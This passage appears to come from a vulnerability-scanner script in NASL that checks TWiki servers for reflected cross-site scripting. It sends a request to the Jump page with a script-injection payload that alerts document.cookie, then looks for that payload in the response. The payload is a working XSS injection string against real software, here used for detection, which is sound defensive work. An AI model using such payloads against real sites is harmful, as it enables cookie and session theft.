...
url = NASLString( dir, "/view/Main/Jump?create=on&amp;newtopic='" + "\"--></style></script><script>alert(document.cookie)</script>" + "&amp;template=WebCreateNewTopic&amp;topicparent=3" );
if(http_vuln_check( port: twikiPort, url: url, pattern: "</style></script>" + "<script>alert\\(document.cookie\\)</script>", extra_check: "TWiki", check_header: TRUE )){
